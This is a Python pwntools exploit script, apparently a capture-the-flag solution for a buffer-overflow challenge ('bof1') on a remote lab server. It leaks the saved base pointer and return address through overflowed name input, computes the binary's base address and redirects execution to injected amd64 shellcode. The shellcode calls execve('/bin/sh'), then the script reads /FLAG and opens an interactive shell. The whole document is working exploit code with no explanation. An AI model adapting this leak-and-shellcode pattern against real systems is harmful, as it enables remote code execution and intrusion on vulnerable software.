#!/usr/bin/env python3

import pwn
import sys

pwn.context.arch = 'amd64'
pwn.context.os = 'linux'

exe = './bof1'
port = 10258

if __name__ == '__main__':
    r = None
    if 'local' in sys.argv[1:]:
        r = pwn.process(exe, shell=False)
    else:
        r = pwn.remote('up.zoolab.org', port)

    s = "\nWhat's your name? "
    p = r.recvuntil(s.encode()).decode()
    print(p)

    s = "1" * 0x20
    r.send(s.encode())
    s = "Welcome, "
    p = r.recvuntil(s.encode())
    p = r.recvline()[0x20 : -1]
    p = p + b"\x00" * (8 - len(p))
    main_rbp = pwn.u64(p)
    print(p)
    print("main_rbp =", hex(main_rbp))

    s = "1" * 0x28
    r.send(s.encode())
    s = "The room number is: "
    p = r.recvuntil(s.encode())
    p = r.recvline()[0x28 : -1]
    p = p + b"\x00" * (8 - len(p))
    ret_addr = pwn.u64(p)
    main_addr = ret_addr - 0xA0
    print(p)
    print("ret_addr =", hex(ret_addr))
    print("main_addr =", hex(main_addr))

    elf = pwn.ELF(exe)
    base = main_addr - elf.symbols["main"]
    msg_addr = base + elf.symbols["msg"]
    s = b"1" * 0x20 + pwn.p64(main_rbp) + pwn.p64(msg_addr)
    r.send(s)

    code = pwn.asm('''
    sub %rsp, 8
                   
    mov %rax, 0x0068732F6E69622F
    mov [%rsp], %rax
                
    mov %rdi, %rsp
    mov %rsi, 0
    mov %rdx, 0
    mov %rax, 0x3b
    syscall
    
    add %rsp, 8
    ret
    ''')
    print(code)
    r.send(code)

    s = "cat /FLAG\n"
    r.send(s.encode())
    r.interactive()
    